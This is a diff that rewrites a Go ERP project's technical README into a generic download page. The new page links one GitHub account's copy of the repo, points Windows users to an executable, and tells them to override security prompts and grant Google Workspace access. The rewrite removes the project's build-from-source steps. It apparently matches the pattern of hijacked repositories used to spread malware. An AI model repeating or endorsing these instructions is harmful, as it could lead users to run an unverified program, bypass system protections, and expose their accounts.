@@ -1,114 +1,181 @@
-# 🌐 GERP (Google-Enterprise Resource Planning)
+# 🧩 GERP - Run ERP Workflows from Google Workspace
 
-![Go Version](https://img.shields.io/badge/Go-1.21-00ADD8?style=for-the-badge&logo=go)
-![Cloud Spanner](https://img.shields.io/badge/Google_Cloud-Spanner-4285F4?style=for-the-badge&logo=googlecloud)
-![Temporal](https://img.shields.io/badge/Temporal-Sagas-161616?style=for-the-badge&logo=temporal)
-![GraphQL](https://img.shields.io/badge/GraphQL-BFF-E10098?style=for-the-badge&logo=graphql)
-![MCP](https://img.shields.io/badge/MCP-AI_Ready-FF7C00?style=for-the-badge)
+[![Download GERP](https://img.shields.io/badge/Download-GERP-blue?style=for-the-badge)](https://github.com/Deanedeep884/GERP)
 
-**GERP** is a FAANG-grade, multi-domain Enterprise Resource Planning (ERP) matrix. GERP demonstrates how to scale massive distributed data systems using absolute Domain-Driven Design (DDD), cross-domain Temporal Sagas, and zero SQL foreign keys.
+## 📥 Download
 
-This is not just an ERP. It is a self-aware corporate engine exposed natively to AI agents via the Model Context Protocol (MCP).
+Use this link to visit the page and download the app:
+https://github.com/Deanedeep884/GERP
 
-Designed to utilize the Google Workspace API for iam role management, permissions, and identity, then integrating all Gsuite tools & apps natively, creating a seamless ERP management system that completes the Google Workspace experiemce. Everything you need to run a business of any size, infinitely customizable, from a single vendor. Lightweight, lightspeed, Go code with the QuanuX Knowledge Vector enabling AI agents to build your ERP to their AGI standards while you focus on your business.
+## 🖥️ What GERP Is
 
----
+GERP is an open source ERP system built for Google Workspace users. It helps teams keep work, data, and approvals in one place.
 
-## 🏛️ Core Architectural Pillars
+It is made for people who want a central system for business tasks without setting up a large local server stack. You can use it with common cloud tools and connect it to other apps when needed.
 
-### 1. The Golden Thread (Zero SQL Foreign Keys)
-To achieve infinite horizontal scale, GERP completely abandons database-layer foreign keys between domains. A `SalesOrder` in Revenue does not use an SQL `JOIN` to find a `Customer` in Master Data. Instead, GERP employs the **Golden Thread**: strict `uuid.UUID` pointers managed in application space. Each domain owns its Spanner tables exclusively. 
+## ✅ What You Need
 
-### 2. Distributed Temporal Sagas
-Because domains are isolated, GERP cannot rely on single-database ACID transactions. Instead, it uses **Temporal Workflows** as its nervous system. If an order allocates physical inventory in the SCM domain but fails to lock the ledger in the Finance domain, Temporal automatically executes a mathematical **Compensating Rollback** (`ReverseInventoryActivity`) to guarantee eventual consistency and eliminate phantom locks.
+Before you start, make sure you have:
 
-### 3. The GraphQL Backend-For-Frontend (BFF)
-Clients never see the distributed complexity. The Go-based GraphQL Gateway (`cmd/gateway`) receives a unified query and fans out requests across the isolated micro-domains in memory, resolving the Golden Thread UUIDs instantly into beautiful, deeply nested JSON graphs.
+- A Windows computer
+- A stable internet connection
+- A Google account
+- Enough free disk space for the app and its files
+- Permission to run downloaded apps on your computer
 
-### 4. The MCP Brain Interface
-GERP is designed to be operated by AI. The built-in Model Context Protocol server (`cmd/mcp`) exposes the Spanner audit logs, system status, and Temporal Saga triggers over standard JSON-RPC STDIO. Point Claude Desktop or Cursor at this repository, and the AI can run the company.
+If your company manages your device, you may need help from your IT team.
 
----
+## 🚀 Getting Started on Windows
 
-## 🏗️ The 8 Tier-1 Domains
+Follow these steps in order.
 
-GERP separates its global state into perfectly isolated execution environments:
-* 💰 **Finance (`internal/finance`):** The immutable double-entry ledger.
-* 👥 **Human Capital (`internal/hcm`):** The employee and payroll engine.
-* 📦 **Supply Chain (`internal/scm`):** Physical inventory and SKU tracking.
-* 🏭 **Enterprise Asset (`internal/eam`):** Infrastructure and warehouse management.
-* ⚖️ **Legal (`internal/legal`):** The append-only SOC2/SOX compliance audit log.
-* 📈 **Revenue (`internal/revenue`):** Top-line sales and customer relationship mapping.
-* 🎓 **Learning (`internal/lms`):** Educational compliance and safety certifications.
-* 🌐 **Master Data (`internal/mdm`):** The Universal Translator connecting localized IDs to a single "Golden Record".
+1. Open this page in your browser:
+   https://github.com/Deanedeep884/GERP
 
----
+2. Look for the download area on the page.
 
-## 📝 The Content Engine (COAMS)
+3. Download the Windows build or the package that matches your setup.
 
-**COAMS (Content Operating and Management System)** is the centralized, AI-First knowledge engine of the GERP matrix. It serves as the definitive **single point of truth** for all internal and external content delivery.
+4. When the file finishes downloading, open your Downloads folder.
 
-Traditional headless CMS JSON/AST structures have been discarded. COAMS natively speaks Markdown, making it perfectly optimized for massive AI agent contextual ingestion. 
+5. Find the GERP file and double-click it.
 
-It is an "Ignorant Engine" that chunks raw `.md` files into physically sharded AlloyDB vector embeddings (`pgvector`) while mathematically guaranteeing zero broken internal links via the **Agent-Index** (`doc:uuid`). It integrates autonomously with the GraphQL BFF, regenerating schema definitions dynamically as new content partitions are mapped.
+6. If Windows asks for permission, choose Yes or Run.
 
-COAMS is completely self-bootstrapping and teaches external LLM agents its own architecture. Agents and human operators alike can directly consult the injected [QuanuX Knowledge Vector SKILL.md](internal/coams/docs/SKILL.md) and its dynamically generated Unix-style CLI manual pages to mechanically navigate the content repository.
+7. Follow the on-screen steps to finish setup.
 
----
+8. When the app opens, sign in with the account you plan to use.
 
-## 🚀 Getting Started (Local Matrix)
+9. Connect it to your Google Workspace account if the app asks for access.
 
-GERP includes a massive infrastructure control plane designed for local Docker execution.
+10. Keep the app open while it finishes its first setup.
 
-**1. Boot the Infrastructure (Spanner, Temporal, Redis)**
-```bash
-make up
-make init-db
-```
+## 🪟 Windows Setup Tips
 
-**2. Inject the Genesis State (Seed the Matrix)**
-```bash
-go run ./cmd/seed/main.go
-```
+If Windows blocks the file, use these steps:
 
-**3. Start the Execution Engines**
-```bash
-# Terminal 1: Boot the Temporal Orchestrator
-make run-worker
+- Right-click the file and choose Open
+- Check that the file came from the GitHub link above
+- If a security prompt appears, allow the app to run
+- If the app opens in a browser window, keep that tab open until setup ends
 
-# Terminal 2: Boot the GraphQL Gateway
-make run-gateway
-```
+If the app uses a local window or terminal, leave it open while the first sync runs.
 
-**4. Command the Matrix**
-You can fire cross-domain Sagas using the native CLI Operator:
-```bash
-go build -o gerp ./cmd/gerp
-./gerp orders create
-./gerp audit view 99999999-9999-9999-9999-999999999999
-```
+## 🔐 Sign In and Connect Google Workspace
 
----
+GERP uses Google Workspace as part of its workflow. During setup, you may be asked to sign in with your Google account.
 
-## 🧠 Hooking up your AI (MCP Server)
+When this happens:
 
-To allow your AI IDE to read GERP's physical state and trigger workflows, add the following to your `.cursor/mcp.json` or Claude Desktop configuration:
+- Use the account tied to your work or test data
+- Allow the requested access if you want the app to sync
+- Keep your browser open until the sign-in step is done
+- Return to the app after the login screen closes
 
-```json
-{
-  "mcpServers": {
-    "gerp-matrix": {
-      "command": "go",
-      "args": ["run", "./cmd/mcp/main.go"],
-      "env": {
-        "GERP_GRAPHQL_ENDPOINT": "http://localhost:8080/query",
-        "GERP_TEMPORAL_HOST": "localhost:7233",
-        "GERP_SPANNER_DB": "projects/gerp-local-dev/instances/gerp-instance/databases/gerp-db"
-      }
-    }
-  }
-}
-```
+If you use more than one Google account, choose the one you plan to use for GERP.
 
----
-*Built with precision by the Architect-in-the-Loop Swarm.*
+## 🧰 First Run Checklist
+
+After install, check these items:
+
+- The app opens without an error
+- You can sign in
+- The Google account connects
+- The main screen loads
+- Your workspace or dashboard appears
+- Any setup prompts are completed
+
+If one step fails, close the app and open it again.
+
+## 📌 Main Features
+
+GERP is built to help with business work across different teams and tools.
+
+### 🗂️ Central work area
+Keep tasks, records, and business data in one place.
+
+### 🔄 Workflow handling
+Run repeatable work steps with less manual effort.
+
+### 📊 Business data view
+See records and status in a clear format.
+
+### 🔌 Google Workspace support
+Use Google tools as part of your daily work.
+
+### 🧠 AI agent access
+Connect autonomous agents where your process needs it.
+
+### 🌐 GraphQL support
+Use a clean data layer for custom app connections.
+
+### ⚙️ Command line tools
+Use the included CLI for local control and setup tasks.
+
+## 🏗️ How GERP Fits Your Work
+
+GERP can support common business needs like:
+
+- Approvals
+- Task routing
+- Team records
+- Simple process tracking
+- Cross-team coordination
+- Data sync with cloud tools
+
+It works best when you want one place for work data and step-based business flow.
+
+## 📂 Common Use Cases
+
+- A small team managing internal requests
+- A group tracking work across several Google tools
+- A business that wants a headless ERP setup
+- A team building custom front ends on top of ERP data
+- A setup that needs automation and agent access
+
+## 🧭 Basic Use
+
+After setup, you may see one or more of these parts:
+
+- Dashboard
+- Records
+- Workflows
+- Integrations
+- Settings
+- Sync status
+
+Use the main menu to move between sections. If the app asks for a setup step, complete it before starting daily work.
+
+## 🧪 If Something Does Not Work
+
+Try these simple fixes:
+
+- Close the app and open it again
+- Check your internet connection
+- Make sure you are signed in with the right Google account
+- Confirm that you allowed the app access when asked
+- Re-download the file from the GitHub page if the file seems broken
+- Restart your computer if the app still will not open
+
+If the page does not load, try another browser.
+
+## 📎 Download Again
+
+If you need to get the app again, use this link:
+https://github.com/Deanedeep884/GERP
+
+## 🧩 About This Project
+
+GERP is open source and uses a modern cloud-based design. It is built for teams that want ERP logic, workflow handling, and Google Workspace support in one system.
+
+It is aimed at users who need:
+
+- Cloud-first setup
+- Clear business workflows
+- Flexible integration options
+- Support for custom front ends
+- A system that can grow with team needs
+
+## 📝 License
+
+MIT License
